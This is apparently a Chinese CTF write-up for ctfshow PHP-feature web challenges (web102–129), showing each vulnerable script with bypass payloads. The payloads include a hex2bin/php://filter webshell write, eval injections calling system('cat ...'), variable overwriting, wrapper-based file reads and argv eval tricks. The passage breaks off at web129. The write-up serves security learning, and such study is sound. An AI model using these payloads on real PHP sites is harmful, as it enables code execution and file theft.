@Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-23 20:59:43 9 10*/ 11 12 13highlight_file(__FILE__); 14$v1 = $_POST[\u0026#39;v1\u0026#39;]; 15$v2 = $_GET[\u0026#39;v2\u0026#39;]; 16$v3 = $_GET[\u0026#39;v3\u0026#39;]; 17$v4 = is_numeric($v2) and is_numeric($v3); 18if($v4){ 19 $s = substr($v2,2); 20 $str = call_user_func($v1,$s); 21 echo $str; 22 file_put_contents($v3,$str); 23} 24else{ 25 die(\u0026#39;hacker\u0026#39;); 26} 27 28 29?\u0026gt; 分析一下这段代码\n首先这段代码会接收三个参数v1,v2,v3\n根据php的特性，当$v2为数字时$v4就会被赋值为1，而与$v3的值无关\n所以想要进入判断，我们首先要使v2为数字\n接着会通过substr对v2前两段进行截断并赋值给s\n下一步就会将v1和s都传入call_user_func函数\ncall_user_func函数有什么用呢?\ncall_user_func 是 PHP 中的一个内置函数，它的主要作用是调用回调函数。\nfunction greet($name) { return \u0026#34;Hello, $name!\u0026#34;; } $message = call_user_func(\u0026#39;greet\u0026#39;, \u0026#39;John\u0026#39;); echo $message; 我们先不管他怎么利用，接着往下看\n最后会调用file_put_contents函数，那思路就很明显了，我们通过写文件来拿到flag\n但是我们要将v2这一串数字经过一系列转换后写入文件并执行要怎么做呢？\n假如说我们可以将php代码转换成base64后再转换成hex，而得到的hex又刚好为数字，那我们就能实现我们的目标。\n那怎么进行格式转换呢?\n我们可以通过call_user_func函数调用php的内置类hex2bin，将我们传入的v2转换回base64编码，接着在写文件的时候，再通过php伪协议的方式将base64先转换为我们的代码再写入文件。\n经过尝试我们可以得到符合条件的代码\n\u0026lt;?=`cat *`; base64:PD89YGNhdCAqYDs= (转hex去掉=) hex:5044383959474E6864434171594473 我们需要在hex前面随便加两位数字来绕过截断\npayload:\nv1=hex2bin v2=665044383959474E6864434171594473\u0026amp;v3=php://filter/write=convert.base64-decode/resource=1.php web103 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-23 21:03:24 9 10*/ 11 12 13highlight_file(__FILE__); 14$v1 = $_POST[\u0026#39;v1\u0026#39;]; 15$v2 = $_GET[\u0026#39;v2\u0026#39;]; 16$v3 = $_GET[\u0026#39;v3\u0026#39;]; 17$v4 = is_numeric($v2) and is_numeric($v3); 18if($v4){ 19 $s = substr($v2,2); 20 $str = call_user_func($v1,$s); 21 echo $str; 22 if(!preg_match(\u0026#34;/.*p.*h.*p.*/i\u0026#34;,$str)){ 23 file_put_contents($v3,$str); 24 } 25 else{ 26 die(\u0026#39;Sorry\u0026#39;); 27 } 28} 29else{ 30 die(\u0026#39;hacker\u0026#39;); 31} 32 33?\u0026gt; 这题相比上一题多了一个过滤\nif(!preg_match(\u0026#34;/.*p.*h.*p.*/i\u0026#34;,$str)){ file_put_contents($v3,$str); } else{ die(\u0026#39;Sorry\u0026#39;); } 继续用上题的方法即可\npayload:\nv1=hex2bin v2=665044383959474E6864434171594473\u0026amp;v3=php://filter/write=convert.base64-decode/resource=1.php web104 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 22:27:20 9 10*/ 11 12 13highlight_file(__FILE__); 14include(\u0026#34;flag.php\u0026#34;); 15 16if(isset($_POST[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 17 $v1 = $_POST[\u0026#39;v1\u0026#39;]; 18 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 19 if(sha1($v1)==sha1($v2)){ 20 echo $flag; 21 } 22} 23 24 25 26?\u0026gt; 使v1=v2即可\nv1=1 v2=1 web105 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 22:34:07 9 10*/ 11 12highlight_file(__FILE__); 13include(\u0026#39;flag.php\u0026#39;); 14error_reporting(0); 15$error=\u0026#39;你还想要flag嘛？\u0026#39;; 16$suces=\u0026#39;既然你想要那给你吧！\u0026#39;; 17foreach($_GET as $key =\u0026gt; $value){ 18 if($key===\u0026#39;error\u0026#39;){ 19 die(\u0026#34;what are you doing?!\u0026#34;); 20 } 21 $$key=$$value; 22}foreach($_POST as $key =\u0026gt; $value){ 23 if($value===\u0026#39;flag\u0026#39;){ 24 die(\u0026#34;what are you doing?!\u0026#34;); 25 } 26 $$key=$$value; 27} 28if(!($_POST[\u0026#39;flag\u0026#39;]==$flag)){ 29 die($error); 30} 31echo \u0026#34;your are good\u0026#34;.$flag.\u0026#34;\\n\u0026#34;; 32die($suces); 33 34?\u0026gt; 本题考查变量覆盖和die()的知识\n$$a = $$b可以类似于，将$a的地址指向$b\n所以无论$b怎么改变值，$a的值都会和$b一样\ndie()函数虽然会终止程序，但同时也会输出括号内的终止提示信息\n方法一：\n本题利用变量覆盖和die()函数的特性\n先对get的内容进行覆盖，且不能覆盖error，所以要覆盖suces，即?suces=flag，此时suces=\u0026gt;flag的地址 再对post的内容进行覆盖，且不能将flag直接覆盖，所以只能error=suces，此时error=\u0026gt;flag的地址 此时无论进入哪个die()函数，都可以输出$flag的值 payload:\nGet: suces=flag POST: error=suces 方法二：\nGet: ?suces=flag\u0026amp;flag= 先将flag的值赋给suces，再将flag的值赋为空，从而通过判断，输出suces的值\nweb106 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 22:38:27 9 10*/ 11 12 13highlight_file(__FILE__); 14include(\u0026#34;flag.php\u0026#34;); 15 16if(isset($_POST[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 17 $v1 = $_POST[\u0026#39;v1\u0026#39;]; 18 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 19 if(sha1($v1)==sha1($v2) \u0026amp;\u0026amp; $v1!=$v2){ 20 echo $flag; 21 } 22} 23 24 25 26?\u0026gt; 我们使用数组绕过即可\nv1[]=1 v2[]=0 web107 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 23:24:14 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15include(\u0026#34;flag.php\u0026#34;); 16 17if(isset($_POST[\u0026#39;v1\u0026#39;])){ 18 $v1 = $_POST[\u0026#39;v1\u0026#39;]; 19 $v3 = $_GET[\u0026#39;v3\u0026#39;]; 20 parse_str($v1,$v2); 21 if($v2[\u0026#39;flag\u0026#39;]==md5($v3)){ 22 echo $flag; 23 } 24 25} 26 27 28 29?\u0026gt; parse_str函数:它用于将字符串解析为变量，如果 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 arr 则会设置到该数组里 ）。\n1\u0026lt;?php 2 //parse_str()将查询的字符串解析到变量中 3 parse_str(\u0026#34;name=Gopal K Verma\u0026amp;age=45\u0026#34;); 4 5 echo $name.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; 6 echo $age; 7?\u0026gt; 其实实际上就是md5弱比较\n方法一：随便给一个值给flag，将MD5转换后的值赋给v3\nv3=1 v1=flag=c4ca4238a0b923820dcc509a6f75849b 方法二:数组绕过\nv3[]=1 v1=\u0026#34;flag[]=1\u0026#34; web108 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 23:53:55 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15include(\u0026#34;flag.php\u0026#34;); 16 17if (ereg (\u0026#34;^[a-zA-Z]+$\u0026#34;, $_GET[\u0026#39;c\u0026#39;])===FALSE) { 18 die(\u0026#39;error\u0026#39;); 19 20} 21//只有36d的人才能看到flag 22if(intval(strrev($_GET[\u0026#39;c\u0026#39;]))==0x36d){ 23 echo $flag; 24} 25 26?\u0026gt; 题目给出的0x36d为16进制数，十进制为877，需要字母开头或结尾的话为877a，因为是==弱比较，可以等同于877，逆序后为a778,直接读取不行，需要加一个截断%00来绕过正则的判断。\npayload\nGET:?c=a%00778 web109 考点:php原生类利用\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-29 22:02:34 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 16 $v1 = $_GET[\u0026#39;v1\u0026#39;]; 17 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 18 19 if(preg_match(\u0026#39;/[a-zA-Z]+/\u0026#39;, $v1) \u0026amp;\u0026amp; preg_match(\u0026#39;/[a-zA-Z]+/\u0026#39;, $v2)){ 20 eval(\u0026#34;echo new $v1($v2());\u0026#34;); 21 } 22 23} 24 25?\u0026gt; 关于php原生类的利用\nhttps://blog.csdn.net/weixin_54902210/article/details/124689580\npayload:\nv1=Exception\u0026amp;v2=system(\u0026#39;cat fl36dg.txt\u0026#39;) or v1=Reflectionclass\u0026amp;v2=system(\u0026#39;cat fl36dg.txt\u0026#39;) 其他的原生类也行，比如Error\nweb110 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-29 22:49:10 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 16 $v1 = $_GET[\u0026#39;v1\u0026#39;]; 17 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 18 19 if(preg_match(\u0026#39;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/\u0026#39;, $v1)){ 20 die(\u0026#34;error v1\u0026#34;); 21 } 22 if(preg_match(\u0026#39;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/\u0026#39;, $v2)){ 23 die(\u0026#34;error v2\u0026#34;); 24 } 25 26 eval(\u0026#34;echo new $v1($v2());\u0026#34;); 27 28} 29 30?\u0026gt; 依旧是对php原生类的利用\n但是增加了对v1和v2的过滤，但是它没有过滤字母，考虑用纯字母构造payload\n类FilesystemIterator可以用来遍历目录，需要一个路径参数\n函数getcwd可以返回当前工作路径且不需要参数，由此可以构造payload\nhttps://fded39f6-0eb1-430b-8f4f-42fd69937aed.challenge.ctf.show?v1=FilesystemIterator\u0026amp;v2=getcwd 得到flag的位置,直接访问即可\nweb111 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-30 02:41:40 9 10*/ 11 12highlight_file(__FILE__); 13error_reporting(0); 14include(\u0026#34;flag.php\u0026#34;); 15 16function getFlag(\u0026amp;$v1,\u0026amp;$v2){ 17 eval(\u0026#34;$$v1 = \u0026amp;$$v2;\u0026#34;); 18 var_dump($$v1); 19} 20 21 22if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 23 $v1 = $_GET[\u0026#39;v1\u0026#39;]; 24 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 25 26 if(preg_match(\u0026#39;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\\u0026lt;|\\\u0026gt;/\u0026#39;, $v1)){ 27 die(\u0026#34;error v1\u0026#34;); 28 } 29 if(preg_match(\u0026#39;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\\u0026lt;|\\\u0026gt;/\u0026#39;, $v2)){ 30 die(\u0026#34;error v2\u0026#34;); 31 } 32 33 if(preg_match(\u0026#39;/ctfshow/\u0026#39;, $v1)){ 34 getFlag($v1,$v2); 35 } 36 37} 38?\u0026gt; 这题是关于变量覆盖的题目\n由于\nif(preg_match(\u0026#39;/ctfshow/\u0026#39;, $v1)){ getFlag($v1,$v2); } 所有我们可以确定v1的值只能为ctfshow\n接下来看getFlag函数\nfunction getFlag(\u0026amp;$v1,\u0026amp;$v2){ eval(\u0026#34;$$v1 = \u0026amp;$$v2;\u0026#34;); var_dump($$v1); } getFlag函数会将v1的地址指向v2，也就是说会使v1的值等于v2\nvar_dump则会输出变量的相关信息\n那我们只需要使v2的值等于我们要查询的变量就可以读到我们的flag\n但是问题来了，我们不知道要查的变量是什么，也不知道是不是在作用域里面\n所这里使用超全局变量 $GLOBALS，$GLOBALS 是PHP的一个超级全局变量组，包含了全部变量的全局组合数组，变量的名字就是数组的键。\n构造payload把所有全局变量全输出来\nhttps://feec7abc-68b0-4b95-86bc-1db857e3624a.challenge.ctf.show?v1=ctfshow\u0026amp;v2=GLOBALS web112 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-30 23:47:49 9 10*/ 11 12highlight_file(__FILE__); 13error_reporting(0); 14function filter($file){ 15 if(preg_match(\u0026#39;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i\u0026#39;,$file)){ 16 die(\u0026#34;hacker!\u0026#34;); 17 }else{ 18 return $file; 19 } 20} 21$file=$_GET[\u0026#39;file\u0026#39;]; 22if(!is_file($file)){ 23 highlight_file(filter($file)); 24}else{ 25 echo \u0026#34;hacker!\u0026#34;; 26} 这题考察的是php伪协议，虽然被ban了data、input 等伪协议，又ban了 string、data、rot13 相关的过滤器，但是还是有不少能用的伪协议和过滤器\n如 php://filter（这里也用不到过滤器）\nhttps://c9c112c8-f426-4008-9e05-712cff76e02c.challenge.ctf.show/?file=php://filter/resource=flag.php 其他\nphp://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php php://filter/read=convert.quoted-printable-encode/resource=flag.php compress.zlib://flag.php 为什么不能直接输入flag.php呢?\nif(!is_file($file)){ highlight_file(filter($file)); }else{ echo \u0026#34;hacker!\u0026#34;; } 那是因为is_file(\u0026ldquo;flag.php\u0026rdquo;)==true，输出hacker！\nweb113 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-30 23:47:52 9 10*/ 11 12highlight_file(__FILE__); 13error_reporting(0); 14function filter($file){ 15 if(preg_match(\u0026#39;/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i\u0026#39;,$file)){ 16 die(\u0026#39;hacker!\u0026#39;); 17 }else{ 18 return $file; 19 } 20} 21$file=$_GET[\u0026#39;file\u0026#39;]; 22if(! is_file($file)){ 23 highlight_file(filter($file)); 24}else{ 25 echo \u0026#34;hacker!\u0026#34;; 26} 这题相比上题把filter过滤了\n我们可以考虑使用其他伪协议\n如 compress.zlib://\ncompress.zlib://flag.php 官方题解 目录溢出导致is_file认为这不是一个文件\n/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/ self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se lf/root/proc/self/root/var/www/html/flag.php web114 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-01 15:02:53 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14function filter($file){ 15 if(preg_match(\u0026#39;/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i\u0026#39;,$file)){ 16 die(\u0026#39;hacker!\u0026#39;); 17 }else{ 18 return $file; 19 } 20} 21$file=$_GET[\u0026#39;file\u0026#39;]; 22echo \u0026#34;师傅们居然tql都是非预期 哼！\u0026#34;; 23if(! is_file($file)){ 24 highlight_file(filter($file)); 25}else{ 26 echo \u0026#34;hacker!\u0026#34;; 27} 这题ban掉了compress和root没办法使用上题的两种解法，但是把filter放出来了\nphp://filter/resource=flag.php 直接读就完事了\nweb115 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-01 15:08:19 9 10*/ 11 12include(\u0026#39;flag.php\u0026#39;); 13highlight_file(__FILE__); 14error_reporting(0); 15function filter($num){ 16 $num=str_replace(\u0026#34;0x\u0026#34;,\u0026#34;1\u0026#34;,$num); 17 $num=str_replace(\u0026#34;0\u0026#34;,\u0026#34;1\u0026#34;,$num); 18 $num=str_replace(\u0026#34;.\u0026#34;,\u0026#34;1\u0026#34;,$num); 19 $num=str_replace(\u0026#34;e\u0026#34;,\u0026#34;1\u0026#34;,$num); 20 $num=str_replace(\u0026#34;+\u0026#34;,\u0026#34;1\u0026#34;,$num); 21 return $num; 22} 23$num=$_GET[\u0026#39;num\u0026#39;]; 24if(is_numeric($num) and $num!==\u0026#39;36\u0026#39; and trim($num)!==\u0026#39;36\u0026#39; and filter($num)==\u0026#39;36\u0026#39;){ 25 if($num==\u0026#39;36\u0026#39;){ 26 echo $flag; 27 }else{ 28 echo \u0026#34;hacker!!\u0026#34;; 29 } 30}else{ 31 echo \u0026#34;hacker!!!\u0026#34;; 32} 参考文章:ctfshow学习记录-web入门（php特性109-115\u0026amp;123\u0026amp;125-126）_ctfshow web109-CSDN博客\nis_numeric可以在数字前面加空格绕过，同时加上空格也可以绕过$num!=\u0026lsquo;36\u0026rsquo;\n但是我们知道trim函数是移除字符串两侧的空白字符或其他预定义字符，空格等字符是会被去掉的\n我们这里考虑使用%0c（换页符）进行绕过\n同时使用%0c也可以绕过filter。\n接下来再看第二个if判断，这是看起来很矛盾的一个判断。\n来具体看一下!==的定义，只要类型不同就不全等。\n如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。此规则也适用于 switch 语句。当用 === 或 !== 进行比较时则不进行类型转换，因为此时类型和数值都要比对。 ——《php手册》语言参考-运算符-比较运算符\n也就是说!==时不进行类型转换。\n所以加上%0c换页符，在==进行类型转换，所有%0c36会被转换为数值36，结果true；在!==不进行类型转换，所以字符串和数值比较，类型不同，结果true。\npayload：\n?num=%0c36 web123 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13error_reporting(0); 14highlight_file(__FILE__); 15include(\u0026#34;flag.php\u0026#34;); 16$a=$_SERVER[\u0026#39;argv\u0026#39;]; 17$c=$_POST[\u0026#39;fun\u0026#39;]; 18if(isset($_POST[\u0026#39;CTF_SHOW\u0026#39;])\u0026amp;\u0026amp;isset($_POST[\u0026#39;CTF_SHOW.COM\u0026#39;])\u0026amp;\u0026amp;!isset($_GET[\u0026#39;fl0g\u0026#39;])){ 19 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\;|\\?/\u0026#34;, $c)\u0026amp;\u0026amp;$c\u0026lt;=18){ 20 eval(\u0026#34;$c\u0026#34;.\u0026#34;;\u0026#34;); 21 if($fl0g===\u0026#34;flag_give_me\u0026#34;){ 22 echo $flag; 23 } 24 } 25} 26?\u0026gt; 这题其实根本不用理会\nif($fl0g===\u0026#34;flag_give_me\u0026#34;){ echo $flag; } 这题对c进行了一定的限制，但是影响不大我们可以直接再eval处执行echo $flag;从而拿到flag\n这题还有一个考点，由于在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换\npayload:\nPOST:CTF_SHOW=1\u0026amp;CTF[SHOW.COM=1\u0026amp;fun= echo $flag web125 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# 10# 11*/ 12error_reporting(0); 13highlight_file(__FILE__); 14include(\u0026#34;flag.php\u0026#34;); 15$a=$_SERVER[\u0026#39;argv\u0026#39;]; 16$c=$_POST[\u0026#39;fun\u0026#39;]; 17if(isset($_POST[\u0026#39;CTF_SHOW\u0026#39;])\u0026amp;\u0026amp;isset($_POST[\u0026#39;CTF_SHOW.COM\u0026#39;])\u0026amp;\u0026amp;!isset($_GET[\u0026#39;fl0g\u0026#39;])){ 18 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i\u0026#34;, $c)\u0026amp;\u0026amp;$c\u0026lt;=16){ 19 eval(\u0026#34;$c\u0026#34;.\u0026#34;;\u0026#34;); 20 if($fl0g===\u0026#34;flag_give_me\u0026#34;){ 21 echo $flag; 22 } 23 } 24} 25?\u0026gt; 这题把上题的echo方法和flag关键词ban了\n考虑通过二次传参的方法读flag\n我一开始考虑了system二次传参的方法，但是system方法应该是被ban掉了\n后面尝试highlight_file方法成功读到flag\npayload:\nPOST CTF_SHOW=1\u0026amp;CTF[SHOW.COM=1\u0026amp;fun=highlight_file($_GET[1]) GET 1=flag.php 其他的 payload：\n1POST CTF_SHOW=\u0026amp;CTF[SHOW.COM=\u0026amp;fun=var_export(get_defined_vars()) web126 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# 10# 11*/ 12error_reporting(0); 13highlight_file(__FILE__); 14include(\u0026#34;flag.php\u0026#34;); 15$a=$_SERVER[\u0026#39;argv\u0026#39;]; 16$c=$_POST[\u0026#39;fun\u0026#39;]; 17if(isset($_POST[\u0026#39;CTF_SHOW\u0026#39;])\u0026amp;\u0026amp;isset($_POST[\u0026#39;CTF_SHOW.COM\u0026#39;])\u0026amp;\u0026amp;!isset($_GET[\u0026#39;fl0g\u0026#39;])){ 18 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i\u0026#34;, $c) \u0026amp;\u0026amp; strlen($c)\u0026lt;=16){ 19 eval(\u0026#34;$c\u0026#34;.\u0026#34;;\u0026#34;); 20 if($fl0g===\u0026#34;flag_give_me\u0026#34;){ 21 echo $flag; 22 } 23 } 24} 基本上ban掉了能读文件的函数\n参考ctfshow-web入门-php特性（web123、web125、web126）_ctfshow web123-CSDN博客\npayload:\nget：?$fl0g=flag_give_me; post：CTF_SHOW=\u0026amp;CTF[SHOW.COM=\u0026amp;fun=eval($a[0]) or GET:?$fl0g=flag_give_me POST:CTF_SHOW=\u0026amp;CTF[SHOW.COM=\u0026amp;fun=assert($a[0]) 这里的查询字符串没有包含 fl0g，但包含了 $fl0g。由于 PHP 中的变量名不包括 $ 符号，所以 isset($_GET[\u0026lsquo;fl0g\u0026rsquo;]) 仍然会返回 false，即没有检测到 fl0g 参数。\npost 传入 CTF_SHOW 和 CTF_SHOW.COM 确保 isset($_POST[\u0026lsquo;CTF_SHOW\u0026rsquo;]) \u0026amp;\u0026amp; isset($_POST[\u0026lsquo;CTF_SHOW.COM\u0026rsquo;]) 这部分条件为真，fun=eval($a[0]) 将 eval($a[0]) 的代码传递给 $c。\n准确来说，此时的 $_SERVER[‘argv’][0] 就等于 $_SERVER[‘QUERY_STRING’]，$_SERVER[\u0026ldquo;QUERY_STRING\u0026rdquo;] 就是查询 (query) 的字符串，这是由于 php.ini 开启了register_argc_argv 配置项。\n当访问 ?$fl0g=flag_give_me; 时，服务器配置使得查询字符串被传递到 $_SERVER[\u0026lsquo;argv\u0026rsquo;] 中。 在这种配置下，$_SERVER[\u0026lsquo;argv\u0026rsquo;][0] 包含了整个查询字符串，即 \u0026lsquo;$fl0g=flag_give_me;\u0026rsquo;。\n在 eval(\u0026quot;$c;\u0026rdquo;); 中实际执行的是 eval(\u0026rsquo;eval($a[0]);\u0026rsquo;);，因为 $a[0] 是 \u0026lsquo;$fl0g=flag_give_me;\u0026rsquo;，这相当于执行了 eval(\u0026rsquo;$fl0g=flag_give_me;\u0026rsquo;);，这样就定义了变量 $fl0g 并赋值为 \u0026lsquo;flag_give_me\u0026rsquo;。\n最后 判断 if($fl0g === \u0026ldquo;flag_give_me\u0026rdquo;)，因为 $fl0g 被正确地设置为了 \u0026lsquo;flag_give_me\u0026rsquo;，所以这个条件为真，因此，echo $flag; 被执行，输出 $flag。\n其他payload:\nGET:?a=1+fl0g=flag_give_me POST:CTF_SHOW=\u0026amp;CTF[SHOW.COM=\u0026amp;fun=parse_str($a[1]) 也同样是为了使fl0g=flag_give_me\nweb127 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-10 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-10 21:52:49 9 10*/ 11 12 13error_reporting(0); 14include(\u0026#34;flag.php\u0026#34;); 15highlight_file(__FILE__); 16$ctf_show = md5($flag); 17$url = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; 18 19 20//特殊字符检测 21function waf($url){ 22 if(preg_match(\u0026#39;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\\u0026#39;|\\\u0026#34;|\\\u0026lt;|\\,|\\\u0026gt;|\\.|\\\\\\|\\//\u0026#39;, $url)){ 23 return true; 24 }else{ 25 return false; 26 } 27} 28 29if(waf($url)){ 30 die(\u0026#34;嗯哼？\u0026#34;); 31}else{ 32 extract($_GET); 33} 34 35 36if($ctf_show===\u0026#39;ilove36d\u0026#39;){ 37 echo $flag; 38} 变量覆盖\n由于下划线被waf了，我们可以传ctf%20show，php会将空格解析成_\npayload:\nctf%20show=ilove36d web128 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-10 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-12 19:49:05 9 10*/ 11 12 13error_reporting(0); 14include(\u0026#34;flag.php\u0026#34;); 15highlight_file(__FILE__); 16 17$f1 = $_GET[\u0026#39;f1\u0026#39;]; 18$f2 = $_GET[\u0026#39;f2\u0026#39;]; 19 20if(check($f1)){ 21 var_dump(call_user_func(call_user_func($f1,$f2))); 22}else{ 23 echo \u0026#34;嗯哼？\u0026#34;; 24} 25 26 27 28function check($str){ 29 return !preg_match(\u0026#39;/[0-9]|[a-z]/i\u0026#39;, $str); 30} 什么是Gettext函数\nPHP: Gettext - Manual\n骚操作\n小知识点： _()是一个函数 _()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll get_defined_vars()函数 get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag payload: ?f1=_\u0026amp;f2=get_defined_vars web129 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 03:18:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;f\u0026#39;])){ 16 $f = $_GET[\u0026#39;f\u0026#39;]; 17 if(stripos($f, \u0026#39;ctfshow\u0026#39;)\u0026gt;0){ 18 echo readfile($f); 19 } 20} stripos() 